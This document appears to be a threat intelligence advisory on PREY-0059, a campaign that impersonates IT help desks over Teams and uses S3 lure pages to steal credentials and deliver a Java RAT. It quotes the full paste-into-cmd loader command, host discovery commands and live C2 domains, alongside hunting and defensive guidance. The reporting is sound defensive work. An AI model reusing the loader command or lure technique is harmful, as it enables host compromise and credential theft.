# 2026-10-15: PREY-0059 Uses Victim-Branded S3 Lures to Deploy Java RAT C2 in Under Five Minutes

## ANALYSTS
- Trevor Daher, Stefan Hostetler, Reid Hutchins

## KEY FINDINGS
- Arctic Wolf is tracking a social engineering threat cluster we designate as PREY-0059, where threat actors use Microsoft Teams to impersonate internal IT help-desk staff and deliver Java-based RAT payloads.
- Lure pages are hosted in Amazon S3, posing as ServiceNow "Self Care Portal" pages. These pages deliver archive files disguised as Windows updates. The pages are also set up to ingest user-supplied account credentials into the same Amazon S3 bucket that the lures themselves are hosted in.
- Commercial EDR products present on affected hosts did not typically block execution, and C2 was reached in under five minutes from the first Teams message. Within six minutes of payload execution, domain controllers were queried over LDAP, followed by scanning for other hosts with running SMB and RPC services.

## ATTACK FLOW
1. Using Microsoft Teams, threat actors message employees from external Entra tenants named after the target, formatted as `<organization>it.onmicrosoft[.]com`, using display names of real IT staff. In some instances, a single sender contacted over 20 employees within one hour. A concurrent surge in inbound phishing email was also reported.

2. The Teams message links to `https://<organization>it.s3.us-east-1.amazonaws[.]com/index.html?<victim email>`, which reaches the victim through the Teams Safe Links wrapper. The lure page includes a "Health Check" credential prompt that saves submitted credentials via HTTP `PUT` to a `results.txt` object in S3. The page source also includes support for Azure Blob Storage as an alternate backend.

3. The lure serves an archive, with filenames structured as `kb<7 digits>.<random 1-character extension>` (for example, `kb2542947.i` or `kb1219613.g`), and saves to the victim's clipboard command to paste into a `cmd.exe` window launched through the Windows Run dialog:

    ```
    mkdir "%appdata%\KB8219614" & tar -xf "%USERPROFILE%\Downloads\kb8219614.g" -C "%appdata%\KB8219614" && tar -xf "%appdata%\KB8219614\xhp40qcl.h" -C "%appdata%\KB8219614" & start "" "%appdata%\KB8219614\bin\javaw.exe" "%appdata%\KB8219614\hrsqo95o0.java" & cls & echo Success
    ```

4. The built-in Windows `tar.exe` extracts a nested archive containing Eclipse Adoptium OpenJDK `25.0.4.1` (`javaw.exe`, `java.exe`, `jvm.dll`, and roughly 40 other JDK tools) alongside four `.java` source files. Every runtime component is legitimately signed, and the nested JDK archive was byte-identical across samples staged for different victims.

5. The RAT includes several modules, including a WebSocket C2 client, a TCP proxy that relays traffic to destinations the operator chooses, and a Windows command-execution and file-management service.

6. Within seconds of execution, the payload runs host discovery through `cmd /c`: `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"`, `set`, `ipconfig /all`, and `tasklist`. It then beacons to a CloudFront-hosted C2 domain, with an Azure Front Door endpoint configured as fallback C2. One sample also queried `ipinfo.io` for the host's public IP address.

## HUNTING GUIDANCE
- Look for `java.exe` or `javaw.exe` deployed to unusual locations on the filesystem, such as `%AppData%\Roaming` with a KB-prefixed subdirectory, especially when the command line ends in a `.java` file rather than `-jar`. Legitimate software rarely runs Java source files directly from a user profile directory.

- Look for `cmd.exe`, spawned by `explorer.exe`, running unexpected `tar -xf` commands against files in the `Downloads` directory, with a non-archive or single-character extension and a destination under `%AppData%`. Confidence increases when a second `tar -xf` follows within seconds against a file inside the newly created directory.

- Review `Zone.Identifier` alternate data streams and browser download telemetry for `HostUrl` or `ReferrerUrl` values matching `*.s3.*.amazonaws.com/*/kb*` or `*.s3.*.amazonaws.com/index.html?<email address>`. Look for your own organization's name in S3 bucket names that you do not own.

- Hunt for DNS queries to `*.cloudfront.net` or `*.azurefd.net` made by `java.exe` or `javaw.exe` running from a user profile. Treat CloudFront and Azure Front Door IP addresses as context only, because they are shared.

- Review domain controller authentication events (`4624`, `4625`, `4776`) for workstation names such as `kali`, and look for a single workstation process generating high-fanout SMB, RPC, and LDAP connections shortly after a Java process starts.

- Review Teams external access logs for one-to-one chats from `*.onmicrosoft.com` tenants whose names combine your organization's name with `it`, `helpdesk`, or similar, particularly when one sender contacts many employees in a short window.

## DEFENSIVE CONSIDERATIONS
- Restrict Microsoft Teams external access to an allowlist of trusted domains, and disable communication with accounts in trial Teams tenants, which threat actors commonly use for this activity.

- Use application control (AppLocker or WDAC) to block execution of `java.exe`, `javaw.exe`, and other interpreters from user-writable paths such as `%AppData%`, `%LocalAppData%`, and `Downloads`.

- Do not rely on file-hash or script-content detection alone. The payload is plain-text Java source run by a signed runtime, so detection should key on execution path, parent process, and command-line structure.

- Educate employees and help-desk staff that IT will not contact users over external Teams chats to deliver updates, and that requests to paste commands into a terminal should be reported through an independent channel.

- If execution is confirmed, reimage the host and reset credentials for the affected user and for any account observed authenticating from the host during the intrusion window. The proxy module gives the operator direct network access from the host, so investigate for lateral movement, not just endpoint persistence.

## ADDITIONAL RESOURCES
- [https://labs.infoguard.ch/posts/anatomy_deno_rat/](https://labs.infoguard.ch/posts/anatomy_deno_rat/)
- [https://learn.microsoft.com/en-us/microsoftteams/trusted-organizations-external-meetings-chat](https://learn.microsoft.com/en-us/microsoftteams/trusted-organizations-external-meetings-chat)

## INDICATORS OF COMPROMISE
The indicators below represent a subset of the IOCs associated with this activity and should not be considered exhaustive. Lure buckets and sender tenants are named after each victim, so the patterns below should be prioritized over individual values.

```
# TEAMS SENDER PATTERN
<name>[@]<organization>it[.]onmicrosoft[.]com

# URL PATTERNS
https[:]//<organization>it[.]s3[.]us-east-1[.]amazonaws[.]com/index[.]html?<victim email> # Lure page
https[:]//<organization>it[.]s3[.]us-east-1[.]amazonaws[.]com/download1/kb<7 digits>[.]<1 letter extension> # Payload archive
https[:]//<organization>-it[.]s3[.]us-east-1[.]amazonaws[.]com/download1/kb<7 digits>[.]<1 letter extension> # Payload archive (hyphenated variant)

# FILE PATHS
%USERPROFILE%\Downloads\kb<7 digits>.<extension>
%APPDATA%\KB<7 digits>\bin\javaw.exe
%APPDATA%\KB<7 digits>\bin\java.exe
%APPDATA%\KB<7 digits>\<random>.java

# FILENAME PATTERNS
kb<7 digits>.<1 letter extension> # Payload archive downloaded from S3; .zip extension also observed
<8-9 random alphanumeric characters>.<1 letter extension> # Nested archive containing the bundled JDK and Java source files
<9-12 random alphanumeric characters>.java # Java source modules executed by javaw.exe or java.exe

# C2 DOMAINS
dvnwl45f3twrc[.]cloudfront[.]net # C2 observed across all Arctic Wolf intrusions
d3nwymnkk7r85v[.]cloudfront[.]net # Secondary C2 configured in Java payload
asqjbtyu-atctg4d2dne6gada[.]z03[.]azurefd[.]net # Alternate C2 configured in Java payload sample

# COMMANDS
tar -xf "%USERPROFILE%\Downloads\kb<7 digits>.<extension>" -C "%APPDATA%\KB<7 digits>"
"%APPDATA%\KB<7 digits>\bin\javaw.exe" "%APPDATA%\KB<7 digits>\<random>.java"
java.exe --enable-native-access=ALL-UNNAMED <random>.java
cmd /c reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
cmd /c set
cmd /c "ipconfig /all"
cmd /c tasklist

# SHA256 HASHES
6c2ede6c7f8cd8fa0ccd41f8d28a88a6fc116e57beef416e5ba58da373c5e258 # Example Java payload archive (kb8064678.h)
22c9d53b29df5e5c1afa2fbbfd425b2890790990419bcf0ef533e3b4ddc6beb5 # Example Java payload archive (kb8219614.g)
4ce1816890a402f9528b4efc5029ab53cbe2b7ab695df0de36ca6017aac75975 # Example Nested archive containing bundled JDK (xhp40qcl.h, er8l60ce.y)
7f5638d23dda6cb2cabe0bcf890f3881420bcc3892e43bd475f287759fd40713 # Example S3 lure page (index.html)

# SHA256 HASHES (Legitimate Eclipse Adoptium OpenJDK 25.0.4.1 binaries; suspicious only when staged under unusual locations, such as %APPDATA%\KB<digits>\bin\)
bfd1f64ca1c9229797a7ddacd3240a42a5808778d4f1ed35311766af1e6e7bc0 # javaw.exe
5808527e3dfc4eb285c7664ba356bc267055ef906e83ed4660d9f7976da7349b # java.exe
3c780198deffd7f9b321c24bbf9810c07e2f48dfedf86886a5bc7f78e5d11a4e # jvm.dll
```
